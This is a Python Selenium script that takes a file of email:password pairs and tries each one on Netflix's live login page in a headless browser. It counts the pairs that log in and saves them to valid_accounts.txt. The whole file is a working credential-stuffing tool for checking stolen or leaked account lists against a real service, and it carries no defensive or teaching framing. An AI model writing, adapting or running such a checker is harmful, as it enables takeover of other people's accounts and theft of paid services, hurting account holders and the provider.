from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import time
import os
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)

login_url = 'https://www.netflix.com/fr-en/login'
submit_url = 'https://www.netflix.com/browse'
c = 0

# Open the file to write valid accounts
valid_accounts_file = open("valid_accounts.txt", "a")

# Configure the browser options
options = Options()

options.add_argument("--disable-gpu")
options.add_argument("--headless")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")

# Create the browser instance
driver = webdriver.Chrome(options=options)

# Set an implicit wait of 5 seconds
driver.implicitly_wait(5)

driver.get(login_url)

# Ask for passlist file
while True:
    passlist = input("Password list: ")
    if os.path.isfile(passlist):
        break
    else:
        print("File not found, please try again.")

# Open the file
with open(passlist, "r") as file:
    # Read the lines of the file
    lines = file.readlines()
    # Iterate over each line
    for line in lines:
        # Split the line at the ":" character
        parts = line.split(":")
        email = parts[0]
        password = parts[1].split(" | ")[0].strip()  # remove the Expires at and any whitespace characters
        # Ignore the rest of the line

        driver.get(login_url)

        driver.find_element('id', 'id_userLoginId').send_keys(email)

        driver.find_element('id', 'id_password').send_keys(password)

        # Press Enter key
        driver.find_element('id', 'id_password').send_keys(Keys.ENTER)

        time.sleep(1)

        # Check if login was successful
        if driver.current_url == submit_url:
            print(Fore.GREEN + "Login successful!")
            c += 1
            # Write email and password to file
            valid_accounts_file.write(email + ":" + password + "\n")
        else:
            print(Fore.RED + "Login failed.")
            print(Fore.YELLOW + driver.current_url)
            print(Fore.MAGENTA + email + ":" + password)

        driver.delete_all_cookies()

print("Valid accounts : ", c)

# Close the browser and the file
driver.quit()
valid_accounts_file.close()
